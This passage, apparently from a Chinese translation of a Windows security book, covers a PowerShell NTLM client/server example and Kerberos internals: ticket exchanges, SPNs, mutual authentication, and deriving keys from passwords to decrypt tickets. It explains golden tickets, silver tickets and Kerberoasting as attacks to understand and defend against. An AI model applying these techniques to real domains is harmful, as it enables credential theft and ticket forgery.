    Send-Message -Client $client -Message $context.Token.ToArray()
    $chal_token = Receive-Message -Client $client
    Update-LsaClientContext -Client $context -Token $chal_token
    Send-Message -Client $client -Message $context.Token.ToArray()

    if (!(Test-LsaContext -Context $context)) {
        throw "Authentication didn't complete as expected."
    }

  ❹ $ok_msg = Receive-TextMessage -Client $client -Context $context
    if ($ok_msg -ne "OK") {
        throw "Failed to authenticate."
    }

  ❺ $msg = Read-Host -Prompt "MSG"
    while($msg -ne "") {
        Send-TextMessage -Client $client -Context $context -Message $msg
        $recv_msg = Receive-TextMessage -Client $client -Context $context
        Write-Host "> $recv_msg"
        $msg = Read-Host -Prompt "MSG"
    }

} catch {
    Write-Error $_
} finally {
    if ($null -ne $socket) {
        $socket.Close()
    }
    if ($null -ne $context) {
        $context.Dispose()
    }
    if ($null -ne $credout) {
        $credout.Dispose()
    }
}
```

*代码清单 13-21：客户端实现*

同样，我们首先定义一些参数❶。在本例中，我们指定要连接的 IP 地址及其 TCP 端口。默认情况下，客户端将连接到 TCP 端口 6543 上的回环地址。接下来，我们需要创建 TCP 套接字❷。因为是客户端，我们可以直接创建 `TcpClient` 对象来连接地址和端口。然后，我们可以像服务器实现中那样，将套接字包装到流读取器和写入器中。

我们创建一个客户端身份验证上下文，以便向服务器进行身份验证 ❸。为此，我们将使用当前用户的凭据，但如有必要，您可以更改此行为。我们还指定目标名称，使其与服务器的目标名称匹配；如果不这样做，服务器将断开我们的连接。我们验证能够读取服务器发送的OK消息 ❹。如果我们没有收到任何内容，或者消息不符合我们的预期，则明确表明身份验证失败。

> 注意
>
> *通常，您不应在网络协议中向客户端返回详细的错误信息。发送简单的OK消息，或完全不发送任何内容，可能无助于诊断问题，但可以防止攻击者找出身份验证失败的原因。例如，如果我们向客户端发送BADPASSWORD消息表示密码错误，或发送BADUSER消息表示用户未知，攻击者就能区分这两种情况，并尝试对有效用户进行暴力破解密码或枚举有效用户名。*

如果身份验证完成，我们现在应该拥有一个有效的连接，因此可以开始发送消息。我们从控制台读取一行文本 ❺ 并将其发送到服务器。然后，我们等待回复并将其打印到控制台。如果我们输入空行，循环应退出，TCP套接字应关闭。这应导致服务器收到空消息，此时服务器也可以退出。

#### NTLM身份验证测试

让我们测试刚刚编写的客户端和服务器。为此，您需要两个PowerShell控制台。在第一个控制台中，使用以下命令运行服务器脚本：


```
PS> .\network_protocol_server.ps1
```


然后，在第二个控制台中，运行客户端。当您看到MSG提示时，输入一条消息（例如Hello）发送到服务器。客户端的输出应类似于以下内容：


```
PS> .\network_protocol_client.ps1
Connected to server 127.0.0.1:6543
MSG: Hello
> User GRAPHITE\user said: HELLO
MSG:
```


在服务器控制台中，输出应显示以下内容：


```
Connection received from 127.0.0.1:60830
User GRAPHITE\user has authenticated.
> Hello
```


现在，如果您在客户端再次按ENTER而不输入消息，客户端和服务器都应无错误退出。

您可以修改脚本以使其执行不同操作。例如，如果您想使用不同的TCP端口，可以为脚本指定Port参数。以下展示了如何将服务器端口设置为11111；客户端的更改方式相同：


```
PS> .\network_protocol_server.ps1 -Port 11111
```


最后，让我们重新审视公共模块代码中Write-Verbose命令的使用。您可能已经注意到，在使用客户端和服务器时，详细输出不会打印到控制台。如果您想查看输出，可以通过更改$VerbosePreference全局变量的值来启用它。此变量通常具有SilentlyContinue值，该值会忽略详细输出。如果将其更改为Continue，详细输出将显示。代码清单 13-22 在连接客户端之前更改了此值。




```
PS> $VerbosePreference = "Continue"
PS> .\network_protocol_client.ps1
VERBOSE: Importing function 'Get-SocketClient'.
VERBOSE: Importing function 'Receive-Message'.
VERBOSE: Importing function 'Receive-TextMessage'.
VERBOSE: Importing function 'Send-Message'.
VERBOSE: Importing function 'Send-TextMessage'.
Connected to server 127.0.0.1:6543
VERBOSE: Sending Message
VERBOSE:           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 4E 54 4C 4D 53 53 50 00 01 00 00 00 B7 B2 08 E2  - NTLMSSP.........
00000010: 09 00 09 00 2D 00 00 00 05 00 05 00 28 00 00 00  - ....-.......(...
--snip--
```


*代码清单 13-22：为客户端启用详细输出*

您可以观察到，我们现在看到了发送到服务器的第一个NTLM身份验证令牌的一部分。当您在客户端和服务器之间来回发送消息时，您可以通过查看十六进制输出来验证数据是否已加密。

这个示例相当长，但应该能让您更好地了解网络身份验证在真实网络场景中是如何工作的。

### 总结

本章描述了 NTLM 身份验证协议，并提供了脚本以演示其身份验证过程。我们探讨了身份验证令牌的协商，以及如何使用 `Format-LsaAuthToken` PowerShell 命令来显示协议状态。

我还向您展示了如何使用 PowerShell 推导 NTLM 协议生成的一些加密值。这包括最终的 NT 响应值（用于证明用户密码的知识）以及消息完整性代码（用于保护 NTLM 身份验证令牌免受篡改）。

为了描述与 NTLM 身份验证相关的风险，我们涵盖了 NTLM 中继攻击以及 Windows 尝试对抗这些攻击的几种方式，例如活动服务器质询记录和通道绑定。我们还讨论了如何使用身份验证上下文来生成签名和加密消息。

现在您已经更好地理解了网络身份验证以及用于生成身份验证令牌的 API，下一章将重点介绍更复杂的 Kerberos 身份验证协议。

## 14. Kerberos

在Windows 2000中，Kerberos认证协议取代了Netlogon，成为域控制器上验证用户身份的主要机制。本章基于第12章中交互式域认证的描述，进一步解释用户如何通过Kerberos向Windows域进行认证。

我们将首先探讨Kerberos的工作原理，包括如何生成协议中使用的加密密钥，以及如何解密Kerberos认证令牌。一旦您理解了协议的内部机制，我们将进一步探讨认证的委派以及Kerberos在用户对用户认证协议中的作用。

Kerberos最初于20世纪80年代在麻省理工学院（MIT）开发。微软采用该协议的第5版，该版本于1993年在RFC1510中正式确立，并于2005年在RFC4120中更新。微软还对协议进行了一些修改，以支持其自身需求；在本章中，我将提及其中一些变更。

### 使用Kerberos进行交互式认证

作为其主要功能，Kerberos分发*票据*，每张票据代表一个用户已验证的身份。系统可以利用该身份来确定用户是否可以访问某项服务，例如文件服务器。例如，如果用户在打开文件的请求中发送其票据，文件服务器可以检查票据的有效性，然后通过类似访问检查的机制决定是否授予用户访问权限。

Kerberos提供了一种在不安全的网络上安全分发这些票据并允许验证票据的方法。它通过使用共享加密密钥（通常由用户密码派生而来）来加密和验证票据。Active Directory服务器从不以明文存储密码；它仅存储加密密钥。

#### 初始用户认证

图14-1展示了客户端计算机与运行*密钥分发中心(Key Distribution Center, KDC)*服务的域控制器之间的初始Kerberos用户认证过程。KDC向用户颁发Kerberos票据并管理会话加密密钥。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-1.webp)

图14-1：Kerberos认证概述

当LSA处理登录请求时，它首先根据用户密码和盐值❶派生共享加密密钥。它根据用户名和领域等值生成盐值，这些值取决于所使用的加密算法类型。我们使用*领域*一词来描述Kerberos认证的范围。在Windows中，领域是包含用户的域的DNS名称，例如*mineral.local*。我们可以将用户名和领域组合成用户主体名称，通常用@符号书写，如*user@mineral.local*。

随后，LSA生成一个*认证服务请求（AS-REQ）*消息，并通过网络发送到认证服务器❷。认证服务器是KDC中负责向认证过程颁发初始票据的部分。AS-REQ消息包含用户名和领域以及*预认证数据*，预认证数据由使用用户共享加密密钥加密的当前时间组成。认证服务器可以使用指定的用户名和领域从其密钥数据库中查找共享密钥，然后使用该密钥解密预认证数据❸。如果解密成功，则验证了数据确实来自该用户，因为只有服务器和客户端应该知道共享加密密钥。

认证服务器随后生成一个*票据授予票据(Ticket-Granting Ticket, TGT)*，并使用特殊用户*krbtgt*的共享加密密钥对其进行加密。认证用户不知道*krbtgt*用户的共享密钥，因此无法解密该票据。虽然TGT有一个特殊的名称，但它本质上只是一张票据，用于向*票据授予服务器(Ticket-Granting Service, TGS)*验证用户身份，TGS负责颁发用户向网络服务进行认证的票据。该票据包含编码在*PAC*中的用户身份详细信息，以及一个随机生成的供TGS使用的会话密钥。我们将在稍后的“解密 AP-REQ 消息”一节中看到 PAC 的示例。

认证服务器还生成第二个数据值，并使用用户的共享加密密钥对其进行加密。该值在解密后包含有关票据的详细信息，例如其有效时长。最终，票据会过期，用户将需要请求新的TGT。这第二个值还包含票据中加密的会话加密密钥。认证服务器将加密的票据和票据信息打包成*认证服务回复（AS-REP）*消息，并发送回客户端LSA❹。图14-2总结了此消息的格式。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-2.webp)

图14-2：AS-REP消息格式

一旦LSA收到AS-REP，它可以使用用户的共享加密密钥解密该消息，并从加密的票据信息中提取会话密钥。成功解密也证明了LSA正在与正确的认证服务器通信，因为其他服务器不会知道用户的共享密钥。

但LSA仍然不知道用户的全部信息，因为这些信息存储在PAC中，而PAC被加密在票据内。为了获取PAC，LSA必须向TGS请求一张针对自身的票据❺。为此，LSA将无法修改的TGT与它想要访问的服务的*服务主体名称（SPN）*打包在一起。SPN是以下形式的字符串：

服务类别/实例名称/服务名称

*服务类别* 是要使用的服务类型。*实例名称* 是服务运行所在的主机名或网络地址。最后，*服务名称* 是一个可选值，用于区分同一主机上相似的服务。为了让LSA请求自身的票据，它必须将服务类别设置为HOST，并将实例名称设置为当前主机，例如 *graphite.mineral.local*。转换为字符串后，就形成了以下SPN：HOST/graphite.mineral.local。

你可能还记得，在第13章中，我们使用这种字符串格式为NTLM认证指定目标名称。实际上，Windows从Kerberos中采用了这种格式，并将其应用于NTLM，以试图对抗NTLM中继攻击。

为了确保服务器能够验证其请求，LSA还会生成TGT的加密哈希。该哈希包含SPN、时间戳和唯一序列号，全部使用AS-REP加密数据值中的会话密钥进行加密。这个额外的加密值被称为*认证器*。TGT、SPN和认证器被打包在*TGS请求（TGS-REQ）*消息中，并发送给TGS。图14-3总结了该消息的格式。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-3.webp)

图14-3：TGS-REQ消息格式

TGS接收到TGS-REQ消息后，由于它知道 *krbtgt* 用户的共享加密密钥，因此能够解密TGT。这使它能够提取有关用户的详细信息以及会话密钥。然后，它可以验证票据是否已过期或是否无效（例如，如果用户不被允许向域或服务进行身份验证，则会出现这种情况）。

TGS可以使用票据中的会话密钥来解密认证器，并验证哈希是否与相关信息匹配。此过程确保只有能够访问共享加密密钥的用户才能从AS-REP中提取会话密钥，并为该TGT加密认证器的内容。随后，TGS验证时间戳是否较新。通常，如果时间戳早于五分钟，它将拒绝该请求。因此，客户端和服务器系统的时间同步对于Kerberos认证至关重要。TGS 还会检查该票据的序列号此前是否已被处理过。此检查用于对抗重放攻击，以防同一 TGS-REQ 被多次重复发送。

如果所有检查均通过，TGS可以在密钥数据库中查找SPN，以获取加密密钥。从技术上讲，每个SPN都可以有自己的加密密钥，但Active Directory通常只是将这些SPN映射到用户或计算机账户。例如，HOST/graphite.mineral.local SPN被映射到 *GRAPHITE* 机器的计算机账户。你可以使用setspn实用程序或Get-ADComputer PowerShell命令查询账户映射到的SPN，如代码清单 14-1所示。




```
PS> Get-ADComputer -Identity $env:COMPUTERNAME -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames
HOST/GRAPHITE
TERMSRV/GRAPHITE.mineral.local
RestrictedKrbHost/GRAPHITE.mineral.local
HOST/GRAPHITE.mineral.local
TERMSRV/GRAPHITE
RestrictedKrbHost/GRAPHITE
```


*代码清单 14-1：枚举映射到当前计算机账户的SPN*

假设主机存在，TGS可以提取它将生成的HOST服务票据的共享加密密钥。如果回到图14-1，你会看到TGS会将解密后的TGT中的PAC复制到这张新票据中，并使用SPN的会话密钥对其进行加密❻。TGS生成与AS-REP相同的加密数据，包括供服务使用的会话密钥。然后，它将新票据和加密值打包到*TGS回复（TGS-REP）*中，并返回给客户端❼。图14-4总结了TGS-REP消息的格式。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-4.webp)

图14-4：TGS-REP消息格式

LSA现在可以验证它能否解密票据的内容，并确保该票据针对其请求的HOST SPN。特别是，在图14-1的最后一步中，它使用PAC创建新用户的Token对象❽。这完成了身份验证过程。用户现已通过身份验证，系统可以启动其登录会话、控制台会话和进程。

黄金票据

Kerberos协议依赖于保持共享加密密钥的机密性。如果攻击者获取了共享密钥或派生这些密钥的密码，他们就可以生成带有任意所需安全信息的自己的Kerberos票据。

一种利用此方法的攻击涉及伪造黄金票据。当`krbtgt`用户的加密密钥被泄露时，这种攻击就可能发生。这允许攻击者使用自己的PAC加密TGT，然后利用它向TGS请求服务票据。由于票据已正确加密，TGS将验证它，并根据TGT的PAC中的用户信息为任何目标服务签发票据。例如，您可以构造一个带有域管理员PAC的服务票据，从而获得对域中任何系统的完全访问权限。

获取`krbtgt`加密密钥通常需要入侵域控制器并从那里提取密钥。这样做似乎有些多余，因为如果您入侵了域控制器，您已经可以控制票据签发，但获取`krbtgt`密钥仍有优势。例如，企业网络上可能有多个域控制器，这些域将共享一个`krbtgt`加密密钥。因此，攻击者可以入侵配置最薄弱的系统，提取密钥，并利用它对网络发起更广泛的攻击，以入侵所有域控制器。这就是为什么微软和业界建议定期轮换`krbtgt`密钥，并提供了安全执行此操作的脚本。

#### 网络服务身份验证

一旦用户在本地计算机上通过身份验证，LSA必须缓存以下信息，用户才能与网络上的其他服务通信：用户的共享加密密钥（基于其密码）、TGT（用于请求其他服务票据）以及TGT会话密钥。

上一章讨论的SSPI API包含一个Kerberos安全包，该包处理网络服务身份验证过程，以根据服务的SPN检索有效票据。图14-5概述了获取网络服务票据的过程。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure14-5.webp)

图14-5：对网络服务的Kerberos身份验证

此身份验证过程涉及三个系统：客户端、服务器和KDC。客户端首先调用`InitializeSecurityContext` SSPI API，并传入用户凭据和网络服务的SPN❶。

在图14-5中，我们假设以已通过身份验证且缓存了TGT的现有用户身份发出身份验证请求。如果不是这种情况，并且我们指定了用户名和密码，LSA需要按照上一节概述的身份验证过程获取该用户的TGT。如果LSA已有有效的TGT，它可以向TGS发出请求，为指定的SPN获取新票据❷。

然后，TGS验证TGT是否有效，以及调用者是否知道会话密钥（TGS可以通过用户的共享密钥提取该会话密钥）。验证该值后，TGS查找目标SPN的共享加密密钥。如果SPN不存在或用户无权使用该服务，它将返回错误，LSA将向调用者报告该错误。如果一切正常，TGS将生成包含新票据的TGS-REP消息，并将其返回给客户端的LSA❸。

与原始TGT一样，TGS使用客户端不应访问的密钥加密票据。但是，它使用TGT的会话密钥加密额外的加密值，LSA可以解密该值。此加密值包含与服务通信的会话密钥。LSA获取票据并生成一个使用服务会话密钥加密的验证器，然后将票据和验证器打包到*身份验证协议请求（AP-REQ）*消息中。此消息的结构与TGS-REQ消息基本相同，但请求发送给服务而非TGS。

LSA 将 AP-REQ 返回给用户 ❹。此时，客户端应用程序重新获得认证过程的控制权，可以将 AP-REQ 封装到网络协议中并传输给服务器 ❺。服务器提取 AP-REQ，并通过 `AcceptSecurityContext` API 将其传递给自己的 LSA ❻。

服务器上的 LSA 应已拥有缓存票据的共享加密密钥。通常会将 SPN 绑定到 *Local System* 用户所使用的计算机账户。因此，任何特权服务（如 SMB 服务器）都应能访问解密票据所需的计算机密码。如果服务以用户身份运行，则系统必须先为该用户配置 SPN 映射，才能接受票据。

假设服务器能够解密并验证票据，其 LSA 将从票据中提取 PAC，并为用户构建本地令牌。PAC 带有签名，服务器可用它来验证票据未被篡改。此外，还可通过可选的验证过程确保 PAC 由 KDC 签发。网络服务现在可以使用生成的令牌来模拟正在认证的用户 ❼。

图 14-5 中的最后一步是可选的。默认情况下，服务器无需向客户端返回任何内容即可完成认证；它已拥有解密票据并让服务访问用户身份所需的一切。然而，您可能希望确保正在通信的服务器知道票据的密钥，而非冒名顶替。服务器证明自己知道加密密钥的一种方式是使用票据的会话密钥加密或签名某些内容，并将其返回给客户端。我们将这种做法称为*相互认证*。

Kerberos 使用*认证协议应答（AP-REP）*消息将此加密值发送回客户端 ❽。AP-REP 消息包含一个类似于 AP-REQ 中发送的认证器值，但其格式略有不同，因为它使用会话密钥进行加密。由于只有票据的有效接收者才能解密会话密钥以加密认证器，这便验证了服务器的身份。

银票与 Kerberoasting

银票是一种比金票更受限的伪造票据类型，但可能更容易获取。此攻击使用服务的共享加密密钥（而非 krbtgt 密钥）来为服务伪造票据，而无需向域控制器请求。票据的内容（包括 PAC）可以模拟任何域用户，包括特权用户。请注意，这种 PAC 修改仅在服务器不通过 KDC 验证 PAC 时才有效。当服务器以特权用户（如 SYSTEM）身份运行时，通常不会启用此验证。

攻击者如何获取服务的共享加密密钥？他们可能先前已入侵服务器并从 LSA 中提取了服务密钥。如果密钥未更改，则可能导致服务的长期受损。另一种方法是暴力破解用于派生加密密钥的密码。如果攻击者能猜出密码，他们可以加密服务票据并检查服务是否接受它。

一种更高效的攻击称为 Kerberoasting，它利用了从 TGS 请求的服务票据已使用服务密钥加密这一事实。攻击者可以为其目标请求服务票据，然后使用返回的信息对密码发起离线暴力破解攻击。我们将在本章的实战示例中介绍 Kerberoasting 的一个案例。

### 在 PowerShell 中执行 Kerberos 身份验证

我们能从 PowerShell 中观察到多少网络服务身份验证过程？让我们来一探究竟。首先，我们获取凭据句柄，如 代码清单 14-2 所示。




```
❶ PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
❷ PS> $spn = "HOST/$env:COMPUTERNAME"
PS> $client = New-LsaClientContext -CredHandle $credout -Target $spn
PS> Format-LsaAuthToken -Token $client.Token
❸ <KerberosV5 KRB_AP_REQ>
Options         : None
<Ticket>
Ticket Version  : 5
❹ ServerName      : SRV_INST - HOST/GRAPHITE
Realm           : MINERAL.LOCAL
❺ Encryption Type : AES256_CTS_HMAC_SHA1_96
❻ Key Version     : 1
Cipher Text     :
00000000: B2 9F B5 0C 7E D9 C4 7F 4A DA 19 CB B4 98 AD 33
00000010: 20 3A 2E C3 35 0B F3 FE 2D FF A7 FD 00 2B F2 54
--snip--
00000410: B7 52 F1 0C 7F 0A C8 5E 87 AD 54 4A
❼ <Authenticator>
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: E4 E9 55 CB 40 41 27 05 D0 52 92 79 76 91 4D 8D
00000010: A1 F2 56 D1 23 1F BF EC 7A 60 14 0E 00 B6 AD 3D
--snip--
00000190: 04 D4 E4 5D 18 60 DB C5 FD
```


*代码清单 14-2：为 Kerberos 设置客户端身份验证上下文*

在此例中，我们指定了 Kerberos 包 ❶，而不是上一章中使用的 NTLM 包。一旦我们收到句柄，就可以创建客户端身份验证上下文。为此，我们必须指定一个要向其进行身份验证的 SPN；这里我选择了本地计算机上的 HOST SPN ❷。

此时，LSA 应使用先前协商的 TGT 获取服务的票据，并发送 TGS-REQ。如果 SPN 不正确或未知，TGS 将返回错误，LSA 在创建客户端身份验证上下文时会将该错误传递给我们。错误信息如下所示：


```
(0x80090303) - The specified target is unknown or unreachable
```


在 代码清单 14-2 中，我们唯一收到的是 AP-REQ ❸；我们没有收到 TGS-REQ 或 TGS-REP。由于我们格式化了 Kerberos 身份验证令牌的字段，我们只能看到明文可用的值。这包括一组当前设置为 None 的选项标志；其他值将指示请求的各种属性，我们将在讨论配置可选的双向身份验证时再回到这一点。

票据还包含目标 SPN 和领域 ❹，服务器需要这些信息来选择正确的共享加密密钥。您可以通过 SRV_INST 名称类型的存在来识别 SPN，该类型表示服务实例。

接下来，票据指定了加密参数。首先，它列出了用于加密和验证密文的算法。在此例中，它使用 AES 密文窃取模式（CTS），使用 256 位密钥进行加密，并使用截断为 96 位的 SHA1 HMAC 进行验证 ❺。表 14-1 显示了 Windows 使用的其他常见加密算法。

| 名称                    | 加密            | 验证                           |
| :---------------------- | :-------------- | :----------------------------- |
| AES256_CTS_HMAC_SHA1_96 | AES CTS 256 位  | SHA1 HMAC 截断为 96 位         |
| AES128_CTS_HMAC_SHA1_96 | AES CTS 128 位  | SHA1 HMAC 截断为 96 位         |
| DES_CBC_MD5             | DES 56 位       | MD5 HMAC                       |
| ARCFOUR_HMAC_MD5        | RC4             | MD5 HMAC                       |

请注意，票据包含*密钥版本号* ❻。当用户或计算机更改密码时，共享加密密钥也必须更改。为确保系统选择正确的密钥，它会将此版本号与密码派生的密钥一起存储，并在每次密钥更改时递增。在此例中，版本号为 1，这意味着该计算机从未更改过密码。

密钥版本号的存在表明票据是使用长期有效的共享加密密钥加密的。缺少版本号则表明票据是使用先前协商的会话密钥加密的。由于我们查看的是此身份验证过程中发送给服务的第一条消息，客户端和服务当前不共享任何会话密钥，因此客户端必须使用计算机的共享加密密钥。

加密的密文跟在密钥信息之后。由于我们不知道加密密钥，因此无法解密。票据之后是验证器 ❼，它也以列出密钥信息开始。请注意缺少密钥版本号；这里缺少它是因为验证器是使用票据内的会话密钥加密的。

> 注意
>
> *在此例中，由于我们生成了针对当前运行计算机的票据，我们可以提取计算机账户加密密钥，无论是通过直接访问内存还是从注册表中的 MACHINE.ACC$ LSA 机密中获取。此过程不在本章讨论范围内。*

我们可以通过将客户端身份验证令牌传递给服务器身份验证上下文来完成身份验证过程，方式与在 第 13 章 中使用 NTLM 身份验证时相同。代码清单 14-3 演示了这一点。




```
PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Token $client.Token
Exception calling "Continue" with "1" argument(s):
"(0x8009030C) - The logon attempt failed"
```


*代码清单 14-3：完成 Kerberos 身份验证*

我们首先设置服务器身份验证上下文，然后使用客户端的身份验证令牌更新该上下文。然而，当我们调用 `Update-LsaServerContext` PowerShell 命令时，身份验证失败并返回错误。也许这并不令人意外。只有 *Local System* 用户才能直接访问用于 HOST SPN 的计算机账户共享加密密钥。因此，当 LSA 验证 AP-REQ 时，它无法解密该请求并返回错误。

我们能否找到一个可以在本地协商的 SPN？Windows 指定了一个 RestrictedKrbHost 服务类。使用此服务类的本地计算机 SPN 映射到计算机账户，因此票据再次使用计算机账户的密钥进行加密。然而，LSA 会特殊对待该服务类，并允许系统上的任何用户解密它，这与 HOST 不同。当我们改用受限服务类执行命令时，得到如 代码清单 14-4 所示的输出。




```
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
❶ PS> $spn = "RestrictedKrbHost/$env:COMPUTERNAME"
PS> $client = New-LsaClientContext -CredHandle $credout -Target $spn
PS> Format-LsaAuthToken -Token $client.Token
<KerberosV5 KRB_AP_REQ>
Options         : None
<Ticket>
Ticket Version  : 5
❷ ServerName      : SRV_INST - RestrictedKrbHost/GRAPHITE
--snip--

PS> $credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound
PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> Use-NtObject($token = Get-LsaAccessToken $server) {
   Get-NtLogonSession $token | Format-Table
}
❸ LogonId           UserName      LogonType SessionId
-------           --------      --------- ---------
00000000-01214E12 MINERAL\alice Network   0
```


*代码清单 14-4：使用 RestrictedKrbHost SPN 进行身份验证*

在这里，我们将 SPN 更改为使用当前计算机名称的 RestrictedKrbHost 服务类 ❶。然后，我们完成身份验证，如 代码清单 14-2 和 14-3 所示。注意 AP-REQ 消息中提供的 SPN 变化 ❷。这次，当我们更新服务器身份验证上下文时，操作成功，因此我们可以提取生成的 Token 对象并显示登录会话 ❸。

在 代码清单 14-5 中，我们测试相互身份验证并查看返回的 AP-REP 消息。




```
❶ PS> $client = New-LsaClientContext -CredHandle $credout
-Target "RestrictedKrbHost/$env:COMPUTERNAME" -RequestAttribute MutualAuth
PS> Format-LsaAuthToken -Token $client.Token
<KerberosV5 KRB_AP_REQ>
❷ Options         : MutualAuthRequired
--snip--

PS> $server = New-LsaServerContext -CredHandle $credin
PS> Update-LsaServerContext -Server $server -Token $client.Token
PS> $ap_rep = $server.Token
PS> $ap_rep | Format-LsaAuthToken
❸ <KerberosV5 KRB_AP_REP>
<Encrypted Part>
❹ Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: 32 E1 3F FC 25 70 51 29 51 AE 4E AC B9 BD 58 72
--snip--
```


*代码清单 14-5：启用相互身份验证*

我们通过在创建客户端身份验证上下文时指定 MutualAuth 请求属性标志来启用相互身份验证 ❶。在 AP-REQ 消息中，我们看到设置了 MutualAuthRequired 标志 ❷，这要求服务返回 AP-REP 消息。当我们格式化服务器的身份验证令牌时，我们看到 AP-REP 消息，其中仅包含一个加密值 ❸。加密密钥信息 ❹ 没有密钥版本号，因为这是由会话密钥加密的，而不是共享加密密钥。

### 解密 AP-REQ 消息

一旦收到 AP-REQ 消息，我们就需要对其进行解密。但到目前为止，我们在示例中加密所有票据时，使用的密钥都是从计算机密码派生出来的。虽然我们或许能够提取此密码用于解密操作，但这将需要大量额外的工作。那么，如何以最小的努力解密 AP-REQ 消息中的票据呢？

一种方法是指定一个 SPN，使得 TGS 使用我们自己的密码。然后，我们可以根据我们控制的账户密码派生加密密钥来解密票据。您可以使用 `setspn` 工具或 `Set-ADUser` PowerShell 命令为用户账户添加 SPN。这需要以域管理员身份执行；否则，您将没有必要的 Active Directory 访问权限来进行配置。以下命令为 *alice* 用户添加 SPN `HTTP/graphite`：


```
PS> Set-ADUser -Identity alice -ServicePrincipalNames @{Add="HTTP/graphite"}
```


您也可以通过将 `Add` 改为 `Remove` 来使用此命令移除 SPN。SPN 几乎可以是任意的，但最佳实践是坚持使用已知的服务类别和主机名。

现在，我们可以运行脚本，使用新的 SPN 执行身份验证。代码清单 14-6 显示了生成的 AP-REQ。




```
PS> $credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound
PS> $client = New-LsaClientContext -CredHandle $credout -Target 
"HTTP/graphite"
PS> Format-LsaAuthToken -Token $client.Token
<KerberosV5 KRB_AP_REQ>
Options         : None
<Ticket>
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
Encryption Type : ARCFOUR_HMAC_MD5
Key Version     : 3
Cipher Text     :
00000000: 1A 33 03 E3 04 47 29 99 AF B5 E0 5B 6A A4 B0 D9
00000010: BA 7E 9F 84 C3 BD 09 62 57 B7 FB F7 86 3B D7 08
--snip--
00000410: AF 74 71 23 96 D6 30 01 05 9A 89 D7
<Authenticator>
Encryption Type : ARCFOUR_HMAC_MD5
Cipher Text     :
00000000: 72 30 A1 25 F1 CC DD B2 C2 7F 61 8B 36 F9 37 B5
00000010: 0C D8 17 6B BB 60 D3 04 6E 3A C4 67 68 3D 90 EE
--snip--
00000180: 5E 91 16 3A 5F 7B 96 35 91
```


*代码清单 14-6：针对 HTTP/graphite SPN 的 AP-REQ*

如果您检查此输出，会发现变化不大，但至少可以确认票据与我们指定的 SPN 相关。这意味着我们可以请求一个应映射到该用户的服务票据。另一个变化是加密类型现在是 RC4 而不是 AES。这是由于 Windows 中 Kerberos 的一个奇特行为：当 SPN 分配给用户时，加密类型默认为 RC4。这对我们来说是个好消息，因为 RC4 解密起来要简单得多，您很快就会看到。同时请注意，密钥版本号已设置，表明票据是使用共享加密密钥加密的。

在解密此票据之前，我们需要为加密算法生成一个密钥。生成 RC4 密钥很简单：我们只需计算其基于的 Unicode 密码的 MD4 哈希。我们此前已经接触过这种操作：此密钥与 NTLM 中使用的 NT 哈希完全相同，这并非巧合。当微软将 RC4 算法引入 Kerberos 时，它使用了 NT 哈希来支持现有用户，而无需他们更新密码以生成新的加密密钥。使用 RC4 算法还规避了涉及加密出口限制的难题。

如果我们提供用户的密码，就可以使用 `Get-KerberosKey` PowerShell 命令生成 RC4 Kerberos 密钥，如 代码清单 14-7 所示。




```
PS> $key = Get-KerberosKey -Password "AlicePassw0rd" -KeyType ARCFOUR_HMAC_MD5
-NameType SRV_INST -Principal "HTTP/graphite@mineral.local"
PS> $key.Key | Out-HexDump
C0 12 36 B2 39 0B 9E 82 EE FD 6E 8E 57 E5 1C E1
```


*代码清单 14-7：为 SPN 生成 RC4 Kerberos 密钥*

请注意，您必须使用运行示例时所用用户账户的有效密码。

生成 AES 密钥

从密码生成 RC4 密钥很容易，因为最终密钥不依赖其他信息。然而，这种设计导致了一些有趣的问题：例如，如果两个账户共享相同的密码，它们可以解密彼此的票据。此外，PowerShell 模块中的解密实现可以在主体不正确或密钥编号不匹配的情况下暴力破解密钥。

然而，AES 密钥则是另一回事。AES 使用基于密码的密钥派生函数 2（PBKDFv2）算法，根据密码计算一个中间密钥，然后使用此密钥生成最终密钥。PBKDFv2 需要三个值来生成中间密钥：密码、一个使密钥更难暴力破解的盐值，以及生成算法应执行的迭代次数。

默认情况下，该算法使用 4,096 次迭代，并通过将领域的大写形式与客户端名称连接来从主体名称派生盐值。例如，`alice@mineral.local` 将创建盐值 `MINERAL.LOCALalice`，而我们使用的 SPN `HOST/graphite@mineral.local` 将生成 `MINERAL.LOCALhostgraphite`。仅使用 SPN 来派生密钥将产生错误的结果，因此在调用 `Get-KerberosKey` 时，您应明确指定盐值，如下所示：


```
PS> $aes_key = Get-KerberosKey -Password "AlicePassw0rd"
-KeyType AES256_CTS_HMAC_SHA1_96 -NameType SRV_INST
-Principal "HTTP/graphite@mineral.local" -Salt "MINERAL.LOCALalice"
PS> $aes_key.Key | Out-HexDump
CF 30 3E 2D BB FA 29 1D EF 87 C1 79 B2 18 7A AD
D3 38 77 27 51 C2 5E C3 C8 DD D8 01 CC AC 0A A9
```


